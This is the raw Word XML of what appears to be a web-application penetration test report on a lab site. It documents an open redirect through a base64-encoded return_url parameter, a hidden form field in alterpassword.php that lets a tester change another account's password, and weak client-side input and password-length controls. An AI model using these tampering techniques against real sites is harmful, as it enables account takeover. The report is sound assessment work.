        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - hidden ID form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A268188" w14:textId="77777777" w:rsidR="00823A40" w:rsidRPr="00823A40" w:rsidRDefault="00823A40" w:rsidP="00823A40"/>
    <w:p w14:paraId="6E84A743" w14:textId="18E1E651" w:rsidR="00823A40" w:rsidRDefault="00A13870" w:rsidP="009D5711">
      <w:r>
        <w:t xml:space="preserve">The URLs that contain a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>return_url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> parameter within, can be modified to redirect the user to a different site than intended</w:t>
      </w:r>
      <w:r w:rsidR="008C7E88">
        <w:t xml:space="preserve">. The format </w:t>
      </w:r>
      <w:r w:rsidR="00875A29">
        <w:t xml:space="preserve">of this field </w:t>
      </w:r>
      <w:r w:rsidR="008C7E88">
        <w:t xml:space="preserve">is the </w:t>
      </w:r>
      <w:r>
        <w:t>intended redirect</w:t>
      </w:r>
      <w:r w:rsidR="00823A40">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008C7E88">
        <w:t>URL</w:t>
      </w:r>
      <w:r w:rsidR="00875A29">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="008C7E88">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00875A29">
        <w:t>with</w:t>
      </w:r>
      <w:r w:rsidR="008C7E88">
        <w:t xml:space="preserve"> base 64 encryption. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="329DEB24" w14:textId="278EAD53" w:rsidR="00B80364" w:rsidRDefault="009D5711" w:rsidP="009D5711">
      <w:r>
        <w:br/>
        <w:t>In the /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>alterpassword.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> page, the hidden form allows </w:t>
      </w:r>
      <w:r w:rsidR="00823A40">
        <w:t>the user</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to change the username for the </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">account of the password being changed. For example, if the password for the </w:t>
      </w:r>
      <w:hyperlink r:id="rId40" w:history="1">
        <w:r w:rsidRPr="00FC2CB7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>hacklab@hacklab.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> account is updated from hacklab to </w:t>
      </w:r>
      <w:r w:rsidR="00A0270C">
        <w:t>hacked</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and the e-mail address in the </w:t>
      </w:r>
      <w:r w:rsidR="00A0270C">
        <w:t>hidden field</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is changed to </w:t>
      </w:r>
      <w:hyperlink r:id="rId41" w:history="1">
        <w:r w:rsidRPr="00FC2CB7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Aboruc@gmail.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00875A29">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as seen in </w:t>
      </w:r>
      <w:r w:rsidR="00A13870">
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">igure </w:t>
      </w:r>
      <w:r w:rsidR="00823A40">
        <w:t>13</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then the password for </w:t>
      </w:r>
      <w:hyperlink r:id="rId42" w:history="1">
        <w:r w:rsidRPr="00FC2CB7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Aboruc@gmail.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> will be updated to </w:t>
      </w:r>
      <w:r w:rsidR="00875A29">
        <w:t>hacked</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F528C88" w14:textId="77777777" w:rsidR="00A0270C" w:rsidRDefault="009D5711" w:rsidP="00A0270C">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="11A3B25E" wp14:editId="4FFE8349">
            <wp:extent cx="5961856" cy="5524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61" t="71225" r="57533" b="21937"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5978321" cy="553976"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CE6300C" w14:textId="004664EB" w:rsidR="009D5711" w:rsidRDefault="00A0270C" w:rsidP="00A0270C">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00D61A4D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>13</w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Password Change</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35CE12E7" w14:textId="5E8C9989" w:rsidR="00A0270C" w:rsidRDefault="00823A40" w:rsidP="00A0270C">
      <w:r>
        <w:t xml:space="preserve">Figure 14 shows the updated database with the new </w:t>
      </w:r>
      <w:hyperlink r:id="rId44" w:history="1">
        <w:r w:rsidRPr="00F20528">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Aboruc@gmail.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> password. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DB7F9E4" w14:textId="457D6432" w:rsidR="00A0270C" w:rsidRDefault="00206945" w:rsidP="00A0270C">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251673600" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="7679AA34" wp14:editId="61A31FEF">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>2033516</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>651681</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1603612" cy="129653"/>
                <wp:effectExtent l="0" t="0" r="15875" b="22860"/>
                <wp:wrapNone/>
                <wp:docPr id="21" name="Rectangle 21"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="1603612" cy="1296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B83FCF" id="Rectangle 21" o:spid="_x0000_s1026" style="position:absolute;margin-left:160.1pt;margin-top:51.3pt;width:126.25pt;height:10.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" filled="f" strokecolor="red" strokeweight="1pt"/>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00823A40">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="184D3B04" wp14:editId="1B7DD740">
            <wp:extent cx="5943600" cy="9944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994410"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="55FA6EBA" w14:textId="285576C7" w:rsidR="00A0270C" w:rsidRDefault="00A0270C" w:rsidP="00A0270C">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00D61A4D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>14</w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Password Change</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0376B9AE" w14:textId="77777777" w:rsidR="007426BA" w:rsidRDefault="007426BA" w:rsidP="007426BA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="18" w:name="_Toc531104336"/>
      <w:r>
        <w:t>Test Client-Side Controls Over User Input</w:t>
      </w:r>
      <w:bookmarkEnd w:id="18"/>
    </w:p>
    <w:p w14:paraId="7CBDEF18" w14:textId="77777777" w:rsidR="00E248A4" w:rsidRDefault="009969FA" w:rsidP="00E248A4">
      <w:r>
        <w:t xml:space="preserve">The script that was used previously will now be changed to search for the keyword “input”. This returned the following URLs: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D8A7657" w14:textId="77777777" w:rsidR="009969FA" w:rsidRDefault="009969FA" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/alterpassword.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63EA9C94" w14:textId="0B4F9079" w:rsidR="009969FA" w:rsidRDefault="00EA689B" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId46" w:history="1">
        <w:r w:rsidR="00323E50" w:rsidRPr="002E20C4">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://192.168.1.10/contact.php</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3A85C3B7" w14:textId="77777777" w:rsidR="009969FA" w:rsidRDefault="009969FA" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/customer.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38B2172D" w14:textId="77777777" w:rsidR="009969FA" w:rsidRDefault="009969FA" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/index.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="232FEF11" w14:textId="77777777" w:rsidR="009969FA" w:rsidRDefault="009969FA" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/insertCustomer.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F3313A" w14:textId="77777777" w:rsidR="009969FA" w:rsidRDefault="009969FA" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/login.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CB42D94" w14:textId="77777777" w:rsidR="009969FA" w:rsidRDefault="009969FA" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/logout.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77454062" w14:textId="77777777" w:rsidR="009969FA" w:rsidRDefault="009969FA" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/products.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36C3EF18" w14:textId="77777777" w:rsidR="009969FA" w:rsidRDefault="009969FA" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/products.php?command&amp;productid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15B834C7" w14:textId="77777777" w:rsidR="009969FA" w:rsidRDefault="009969FA" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/profile.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56CD6D97" w14:textId="77777777" w:rsidR="009969FA" w:rsidRDefault="009969FA" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/userValidate.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F215A5" w14:textId="77777777" w:rsidR="009969FA" w:rsidRDefault="009969FA" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/warehouse_1.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F3521F9" w14:textId="77777777" w:rsidR="009969FA" w:rsidRDefault="009969FA" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/warehouse_1.php?command&amp;productid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14652ECB" w14:textId="77777777" w:rsidR="009969FA" w:rsidRDefault="009969FA" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/warehouse_2.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08C0D35A" w14:textId="77777777" w:rsidR="009969FA" w:rsidRDefault="009969FA" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/warehouse_2.php?command&amp;productid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6878E09C" w14:textId="77777777" w:rsidR="009969FA" w:rsidRDefault="009969FA" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/home.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="004DB45E" w14:textId="77777777" w:rsidR="009969FA" w:rsidRDefault="009969FA" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/process.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="400D18A5" w14:textId="77777777" w:rsidR="009969FA" w:rsidRDefault="009969FA" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/session.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51774902" w14:textId="77777777" w:rsidR="009969FA" w:rsidRDefault="00EA689B" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId47" w:history="1">
        <w:r w:rsidR="009969FA" w:rsidRPr="002E20C4">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://192.168.1.10/phpinfo.php</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6838BC7F" w14:textId="7C6F2B73" w:rsidR="009969FA" w:rsidRDefault="009969FA" w:rsidP="009969FA">
      <w:r>
        <w:t xml:space="preserve">By searching for </w:t>
      </w:r>
      <w:r w:rsidR="00243688">
        <w:t>the word “input”, it</w:t>
      </w:r>
      <w:r w:rsidR="00274128">
        <w:t xml:space="preserve"> mean</w:t>
      </w:r>
      <w:r w:rsidR="00243688">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that all URLs</w:t>
      </w:r>
      <w:r w:rsidR="00243688">
        <w:t xml:space="preserve"> that contain a form that allows user input are found.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> These forms will now be tested, to see </w:t>
      </w:r>
      <w:r w:rsidR="00875A29">
        <w:t>if any controls</w:t>
      </w:r>
      <w:r w:rsidR="00347253">
        <w:t xml:space="preserve"> that have been</w:t>
      </w:r>
      <w:r w:rsidR="00875A29">
        <w:t xml:space="preserve"> put in place, are reinforced. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A44E1E" w14:textId="251AA427" w:rsidR="00765CAA" w:rsidRDefault="00567F10" w:rsidP="009969FA">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">On the contact page, it is specified that the subject field can only accept </w:t>
      </w:r>
      <w:r w:rsidR="000C1ACD">
        <w:t>one hundred</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> characters. Upon testing</w:t>
      </w:r>
      <w:r w:rsidR="00765CAA">
        <w:t xml:space="preserve">, more than 100 characters can be entered into the </w:t>
      </w:r>
      <w:r w:rsidR="00243688">
        <w:t>subject</w:t>
      </w:r>
      <w:r w:rsidR="00765CAA">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00243688">
        <w:t>field</w:t>
      </w:r>
      <w:r w:rsidR="00206945">
        <w:t xml:space="preserve"> text box</w:t>
      </w:r>
      <w:r w:rsidR="00765CAA">
        <w:t xml:space="preserve">, but </w:t>
      </w:r>
      <w:r w:rsidR="00EB5293">
        <w:t xml:space="preserve">only the first </w:t>
      </w:r>
      <w:r w:rsidR="000C1ACD">
        <w:t>one hundred</w:t>
      </w:r>
      <w:r w:rsidR="00EB5293">
        <w:t xml:space="preserve"> charac</w:t>
      </w:r>
      <w:r w:rsidR="00243688">
        <w:t>ters are stored in the database</w:t>
      </w:r>
      <w:r w:rsidR="00206945">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00243688">
        <w:t xml:space="preserve"> with</w:t>
      </w:r>
      <w:r w:rsidR="00EB5293">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00243688">
        <w:t>the remainder of characters being dropped.</w:t>
      </w:r>
      <w:r w:rsidR="00206945">
        <w:t xml:space="preserve"> The user is not informed of this when they are entering characters into the text box.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3155CA03" w14:textId="72655383" w:rsidR="00363D2B" w:rsidRDefault="00C565EC" w:rsidP="009969FA">
      <w:r>
        <w:t>In the /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>profile.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> page</w:t>
      </w:r>
      <w:r w:rsidR="0026546B">
        <w:t xml:space="preserve"> there is an option that allows </w:t>
      </w:r>
      <w:r w:rsidR="00243688">
        <w:t>the user</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to upload a file</w:t>
      </w:r>
      <w:r w:rsidR="0026546B">
        <w:t xml:space="preserve"> and the html input type is specified as file. Upon attempting to change</w:t>
      </w:r>
      <w:r w:rsidR="00206945">
        <w:t xml:space="preserve"> the input type to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> text</w:t>
      </w:r>
      <w:r w:rsidR="0026546B">
        <w:t xml:space="preserve"> and enter</w:t>
      </w:r>
      <w:r w:rsidR="00243688">
        <w:t xml:space="preserve"> a</w:t>
      </w:r>
      <w:r w:rsidR="0026546B">
        <w:t xml:space="preserve"> text input rather than a file, the server detected tha</w:t>
      </w:r>
      <w:r>
        <w:t>t no file was submitted</w:t>
      </w:r>
      <w:r w:rsidR="006D5F5A">
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidR="000C1ACD">
        <w:t xml:space="preserve">outputted an </w:t>
      </w:r>
      <w:r w:rsidR="00206945">
        <w:t>alert box containing an error message. This</w:t>
      </w:r>
      <w:r w:rsidR="000C1ACD">
        <w:t xml:space="preserve"> can be seen in</w:t>
      </w:r>
      <w:r w:rsidR="00243688">
        <w:t xml:space="preserve"> F</w:t>
      </w:r>
      <w:r w:rsidR="006D5F5A">
        <w:t xml:space="preserve">igure </w:t>
      </w:r>
      <w:r w:rsidR="00243688">
        <w:t>15</w:t>
      </w:r>
      <w:r w:rsidR="006D5F5A">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4333AB42" w14:textId="77777777" w:rsidR="00CD3F64" w:rsidRDefault="006D5F5A" w:rsidP="006D5F5A">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2EA7F841" wp14:editId="7CEBA841">
            <wp:extent cx="2562225" cy="1276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2225" cy="1276350"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="303DD879" w14:textId="533E3784" w:rsidR="006D5F5A" w:rsidRDefault="006D5F5A" w:rsidP="006D5F5A">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00D61A4D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>15</w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - File upload error</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FA65719" w14:textId="75753F9D" w:rsidR="00CD3F64" w:rsidRDefault="00CD3F64" w:rsidP="00CD3F64">
      <w:r>
        <w:t xml:space="preserve">Overall, the majority of the input types for the application are text, even when </w:t>
      </w:r>
      <w:r w:rsidR="000C1ACD">
        <w:t>the input required is not text</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (for example the mobile no</w:t>
      </w:r>
      <w:r w:rsidR="000C1ACD">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> form in the contact page).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B683C50" w14:textId="77777777" w:rsidR="00CD3F64" w:rsidRPr="00CD3F64" w:rsidRDefault="00CD3F64" w:rsidP="00CD3F64"/>
    <w:p w14:paraId="34ADB5EC" w14:textId="7D149A30" w:rsidR="00D03B10" w:rsidRDefault="00D03B10" w:rsidP="000C1ACD">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="19" w:name="_Toc531104337"/>
      <w:r>
        <w:t>Test the Authentication Mechanism</w:t>
      </w:r>
      <w:bookmarkEnd w:id="19"/>
    </w:p>
    <w:p w14:paraId="0728DFB4" w14:textId="579F83E1" w:rsidR="00905E69" w:rsidRDefault="00905E69" w:rsidP="00905E69">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="20" w:name="_Toc531104338"/>
      <w:r>
        <w:t>Test Password Quality</w:t>
      </w:r>
      <w:bookmarkEnd w:id="20"/>
    </w:p>
    <w:p w14:paraId="1D932C53" w14:textId="75D37823" w:rsidR="00206945" w:rsidRPr="00206945" w:rsidRDefault="00206945" w:rsidP="00206945">
      <w:r>
        <w:t xml:space="preserve">When creating a password, the application does not inform the user what characters are valid. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Therefore</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> testing must be undertaken to establish what the password requirements and restrictions are. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="073AF85E" w14:textId="35363C8A" w:rsidR="00243688" w:rsidRPr="00243688" w:rsidRDefault="00243688" w:rsidP="00243688">
      <w:r>
        <w:t>Several different passwords were created, varying from zero to 100 characters long, with uppercase, lowercase, numbers and special characters being used.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="461AA783" w14:textId="3441C379" w:rsidR="00905E69" w:rsidRDefault="00905E69" w:rsidP="00905E69">
      <w:r>
        <w:t>Upon testing what input is accepted for passwords, it wa</w:t>
      </w:r>
      <w:r w:rsidR="00206945">
        <w:t>s found that</w:t>
      </w:r>
      <w:r w:rsidR="007235EF">
        <w:t xml:space="preserve"> passwords can be anywhere from zero to twenty characters. If a user creates a password that is longer than twenty characters, then it will cut</w:t>
      </w:r>
      <w:r w:rsidR="00243688">
        <w:t xml:space="preserve"> any characters after the twentieth character</w:t>
      </w:r>
      <w:r w:rsidR="000C1ACD">
